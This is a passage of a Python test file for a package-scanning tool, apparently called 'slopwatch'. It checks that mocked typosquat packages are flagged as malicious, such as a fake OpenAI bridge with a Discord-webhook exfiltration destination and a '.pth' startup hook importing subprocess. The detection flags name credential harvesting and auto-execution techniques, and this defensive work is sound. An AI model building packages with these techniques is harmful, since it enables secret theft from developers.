        first_published_at=datetime(2017, 3, 10, tzinfo=timezone.utc),
        latest_release_at=datetime(2017, 3, 10, tzinfo=timezone.utc),
    )

    # Suppose it contains child_process / loader in bundled legacy JS
    mock_ast = ASTSecurityReport(
        total_source_files=30,
        total_lines_of_code=82000,
        total_code_size_bytes=1500000,
        is_empty_stub=False,
        code_size_tier="LARGE_CODEBASE",
        flags=[
            "SOURCE_CODE_DYNAMIC_CODE_LOADER: execution primitive combined with decode/network in serve.js",
            "SOURCE_CODE_DYNAMIC_EXECUTION: 'require(\"child_process\")' found in serve.js:10",
        ],
        composite_threat_score=80,
        verdict=ThreatVerdict.MALICIOUS,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        assert detection.is_deprecated is True
        # Must NOT be MALICIOUS; should be disqualified to BENIGN_COMMUNITY
        assert detection.verdict != ThreatVerdict.MALICIOUS
        assert detection.verdict == ThreatVerdict.BENIGN_COMMUNITY
        assert detection.threat_score <= 35


@pytest.mark.asyncio
async def test_evaluate_stealer_package_exfiltration_and_secrets_is_malicious(mocker):
    """
    Test that a package combining an exfiltration endpoint (Discord webhook)
    with secret/env harvesting is classified as MALICIOUS even without a setup.py
    socket call.
    """
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="fake-openai-bridge",
        entity_token="openai",
        capability_token="bridge",
        framework_token="python",
        risk_weight=80,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="fake-openai-bridge",
        latest_version="1.0.0",
        author="stealth_threat",
        monthly_downloads=0,
        first_published_at=datetime.now(timezone.utc),
        latest_release_at=datetime.now(timezone.utc),
    )

    mock_ast = ASTSecurityReport(
        total_source_files=2,
        total_lines_of_code=45,
        total_code_size_bytes=1100,
        is_empty_stub=False,
        code_size_tier="TINY_CODEBASE",
        has_exfiltration_destination=True,
        has_credential_harvesting=True,
        flags=[
            "EXFILTRATION_DESTINATION_DETECTED: Discord Webhook in bridge.py:12",
            "SOURCE_CODE_ENV_VARS_ACCESS: Access to os.environ in bridge.py:8",
        ],
        composite_threat_score=60,
        verdict=ThreatVerdict.SUSPICIOUS,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        assert detection.verdict == ThreatVerdict.MALICIOUS
        assert detection.analysis_details["has_confirmed_dangerous_execution"] is True
        assert detection.threat_score >= 100


@pytest.mark.asyncio
async def test_evaluate_pth_execution_package_is_malicious(mocker):
    """
    Test that Python .pth auto-execution startup hooks are classified as MALICIOUS.
    """
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="fake-anthropic-sdk",
        entity_token="anthropic",
        capability_token="sdk",
        framework_token="python",
        risk_weight=80,
    )

    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="fake-anthropic-sdk",
        latest_version="1.0.0",
        author="hades_actor",
        monthly_downloads=2,
        first_published_at=datetime.now(timezone.utc),
        latest_release_at=datetime.now(timezone.utc),
    )

    mock_ast = ASTSecurityReport(
        total_source_files=1,
        total_lines_of_code=30,
        total_code_size_bytes=800,
        is_empty_stub=False,
        code_size_tier="TINY_CODEBASE",
        has_pth_execution=True,
        flags=[
            "PYTHON_PTH_CODE_EXECUTION: Dangerous startup module 'subprocess' imported in init.pth: 'import subprocess'",
        ],
        composite_threat_score=85,
        verdict=ThreatVerdict.MALICIOUS,
    )

    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
        assert detection.verdict == ThreatVerdict.MALICIOUS
        assert detection.analysis_details["has_confirmed_dangerous_execution"] is True
        assert detection.analysis_details["has_pth_execution"] is True





@pytest.mark.asyncio
async def test_evaluate_populates_findings_and_runs_plugin_detectors(mocker):
    """analysis_details['findings'] is populated and an auto-discovered plugin
    detector (suspicious_description) contributes a finding + points."""
    evaluator = ProgressiveThreatEvaluator()
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI,
        normalized_name="fastapi-stripe-billing",
        entity_token="stripe",
        capability_token="billing",
        framework_token="fastapi",
        risk_weight=70,
    )
    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI,
        package_name="fastapi-stripe-billing",
        latest_version="0.1.0",
        author="anon",
        author_email="anon@gmail.com",
        description="Get your free airdrop now — join t.me/thischannel to claim your reward!",
        monthly_downloads=0,
        published_at=datetime(2026, 6, 1, tzinfo=timezone.utc),
        first_published_at=datetime(2026, 6, 1, tzinfo=timezone.utc),
    )
    mock_ast = ASTSecurityReport(
        total_source_files=2, total_lines_of_code=40, total_code_size_bytes=1200,
        is_empty_stub=False, code_size_tier="TINY_CODEBASE", flags=[],
        composite_threat_score=0, verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )
    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)

    findings = detection.analysis_details["findings"]
    codes = {f["code"] for f in findings}
    assert "SUSPICIOUS_DESCRIPTION_LINK" in codes
    assert "SIGNAL_COMBINATORIAL_GRAMMAR_MATCH" in codes
    # every finding references a real catalog entry or is at least well-formed
    for f in findings:
        assert f["code"] and f["severity"] in {"CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"}


@pytest.mark.asyncio
async def test_plugin_detector_failure_never_breaks_scoring(mocker):
    """A raising detector engine must not stop evaluate_candidate returning a verdict."""
    class BoomEngine:
        async def run(self, ctx):
            raise RuntimeError("detector subsystem down")

    evaluator = ProgressiveThreatEvaluator(detection_engine=BoomEngine())
    candidate = WatchlistCandidate(
        ecosystem=Ecosystem.PYPI, normalized_name="django-slack-oauth",
        entity_token="slack", capability_token="oauth", framework_token="django", risk_weight=60,
    )
    mock_meta = PackageMetadata(
        ecosystem=Ecosystem.PYPI, package_name="django-slack-oauth", latest_version="1.0.0",
        author="dev", author_email="dev@gmail.com", description="x" * 40, monthly_downloads=5000,
    )
    mock_ast = ASTSecurityReport(
        total_source_files=5, total_lines_of_code=600, total_code_size_bytes=20000,
        is_empty_stub=False, code_size_tier="MODERATE_CODEBASE", flags=[],
        composite_threat_score=0, verdict=ThreatVerdict.BENIGN_COMMUNITY,
    )
    mock_adapter = mocker.MagicMock()
    mock_adapter.inspect_package_metadata = AsyncMock(return_value=mock_meta)
    mock_adapter.download_and_inspect_payload = AsyncMock(return_value=mock_ast)

    with patch("slopwatch.adapters.get_adapter", return_value=mock_adapter):
        detection = await evaluator.evaluate_candidate(candidate)
    assert detection.verdict is not None
    assert "findings" in detection.analysis_details
